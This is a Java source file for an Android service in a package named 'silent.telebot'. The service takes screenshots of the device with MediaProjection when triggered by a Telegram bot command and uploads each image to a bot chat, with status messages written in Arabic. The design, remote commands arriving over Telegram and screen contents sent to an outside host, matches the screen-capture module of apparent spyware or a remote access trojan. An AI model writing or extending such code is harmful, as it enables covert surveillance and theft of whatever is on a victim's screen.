package com.silent.telebot;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {
    private static final String TAG = "ScreenCaptureService";
    private static int resultCode = -1;
    private static Intent resultData = null;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    public static void setResultData(int code, Intent data) {
        resultCode = code;
        resultData = data;
    }

    public static boolean isPermissionAvailable() {
        return resultData != null && resultCode != -1;
    }

    public static void takeScreenshot(Context context, String chatId, String botToken) {
        if (!isPermissionAvailable()) {
            TelegramPoller.sendMessageStatic(chatId, "❌ صلاحية لقطة الشاشة غير مفعلة. الرجاء فتح التطبيق والموافقة على النافذة المنبثقة.");
            return;
        }
        try {
            Intent serviceIntent = new Intent(context, ScreenCaptureService.class);
            serviceIntent.putExtra("chatId", chatId);
            serviceIntent.putExtra("botToken", botToken);
            context.startService(serviceIntent);
        } catch (Exception e) {
            TelegramPoller.sendMessageStatic(chatId, "❌ فشل بدء خدمة لقطة الشاشة: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String chatId = intent.getStringExtra("chatId");
        String botToken = intent.getStringExtra("botToken");
        if (chatId == null || botToken == null) {
            stopSelf();
            return START_NOT_STICKY;
        }
        new Thread(() -> {
            try {
                captureScreen(chatId, botToken);
            } catch (Exception e) {
                TelegramPoller.sendMessageStatic(chatId, "❌ خطأ: " + e.getMessage());
            } finally {
                stopSelf();
            }
        }).start();
        return START_STICKY;
    }

    private void captureScreen(String chatId, String botToken) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                TelegramPoller.sendMessageStatic(chatId, "❌ نظامك لا يدعم لقطة الشاشة.");
                return;
            }

            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (projectionManager == null || resultData == null) {
                TelegramPoller.sendMessageStatic(chatId, "❌ صلاحية غير مفعلة.");
                return;
            }

            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
            if (mediaProjection == null) {
                TelegramPoller.sendMessageStatic(chatId, "❌ فشل MediaProjection.");
                return;
            }

            // 🔥 الحصول على أبعاد الشاشة الفعلية
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getMetrics(metrics);
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            // إنشاء ImageReader بدقة الشاشة الفعلية
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenCapture",
                    width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null, null
            );

            // الانتظار قليلاً لالتقاط الإطار
            Thread.sleep(300);

            Image image = imageReader.acquireLatestImage();
            if (image == null) {
                TelegramPoller.sendMessageStatic(chatId, "❌ صورة فارغة.");
                return;
            }

            // استخراج البيكسلات من الصورة
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * width;

            // إنشاء Bitmap بالحجم الصحيح
            Bitmap bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride,
                    height,
                    Bitmap.Config.ARGB_8888
            );
            bitmap.copyPixelsFromBuffer(buffer);

            // قص الصورة لإزالة الحشو (إن وجد)
            Bitmap finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
            bitmap.recycle();

            // حفظ الصورة في ملف
            File screenshotFile = new File(getCacheDir(), "screenshot.png");
            FileOutputStream fos = new FileOutputStream(screenshotFile);
            finalBitmap.compress(Bitmap.CompressFormat.PNG, 90, fos);
            fos.flush();
            fos.close();
            finalBitmap.recycle();
            image.close();

            // إرسال الصورة عبر البوت
            TelegramPoller.sendPhotoStatic(chatId, screenshotFile, botToken);

            // تنظيف الموارد
            if (virtualDisplay != null) virtualDisplay.release();
            if (mediaProjection != null) mediaProjection.stop();
            if (imageReader != null) imageReader.close();

        } catch (Exception e) {
            TelegramPoller.sendMessageStatic(chatId, "❌ فشل الالتقاط: " + e.getMessage());
            Log.e(TAG, "Error: " + e.getMessage());
        } finally {
            stopSelf();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (virtualDisplay != null) virtualDisplay.release();
        if (mediaProjection != null) mediaProjection.stop();
        if (imageReader != null) imageReader.close();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
                } 
